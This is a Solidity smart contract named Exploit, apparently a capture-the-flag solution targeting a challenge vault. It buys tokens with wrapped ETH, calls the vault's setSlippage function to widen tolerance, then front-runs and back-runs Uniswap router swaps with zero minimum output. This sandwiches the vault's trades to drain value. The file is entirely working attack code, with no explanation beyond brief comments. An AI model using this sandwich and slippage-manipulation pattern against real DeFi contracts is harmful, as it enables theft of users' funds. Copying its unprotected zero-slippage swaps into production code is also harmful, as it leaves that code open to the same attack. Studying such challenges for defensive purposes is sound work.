// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import "./IERC20.sol";
import "./IVault.sol";
import "./IChallenge.sol";
import "./IRouter.sol";

contract Exploit {

    IERC20 public beyond;
    IERC20 public weth;
    IChallenge challenge;
    IVault vault;
    IRouter router;
    address frontranToken;

    constructor(address _challenge) payable {
        challenge = IChallenge(_challenge);
        beyond = IERC20(challenge.beyond());
        weth = IERC20(challenge.WETH());
        vault = IVault(challenge.vault());
        router = IRouter(challenge.uniswapRouter());
        beyond.approve(address(router), type(uint256).max);
        weth.approve(address(router), type(uint256).max);
        frontranToken = address(weth);
    }

    function buy() external {
        weth.deposit{value : address(this).balance}();
        weth.approve(address(beyond), 200 ether);
        beyond.buy(200 ether);
    }

    function frontrun(address token) external {
        frontranToken = token;
        address[] memory path = new address[](2);
        path[0] = frontranToken;
        path[1] = address(beyond) == frontranToken ? address(weth) : address(beyond);
        uint256 balance = IERC20(frontranToken).balanceOf(address(this));
        vault.setSlippage(1000);
        // Making sure the contract has enough token to swap
        if(balance > 0) {
            router.swapExactTokensForTokens(
                IERC20(frontranToken).balanceOf(address(this)),
                0, // slippage doesn't matter for the challenge
                path,
                address(this),
                block.timestamp
            );
        }
    }

    // If we bought WETH previously, we now buy Beyond and vice-versa
    function backrun() external {
        address tokenToSell = address(beyond) == frontranToken ? address(weth) : address(beyond);
        address[] memory path = new address[](2);
        path[0] = tokenToSell;
        path[1] = frontranToken;
        uint256 balance = IERC20(tokenToSell).balanceOf(address(this));
        vault.setSlippage(5);
        // Making sure the contract has enough token to swap
        if(balance > 0) {
            router.swapExactTokensForTokens(
                IERC20(tokenToSell).balanceOf(address(this)),
                0, // slippage doesn't matter for the challenge
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function isSolved() external view returns(bool) {
        return challenge.isSolved();
    }

    function getVaultBalance(address token) external view returns(uint256) {
        return IERC20(token).balanceOf(address(vault));
    }

}
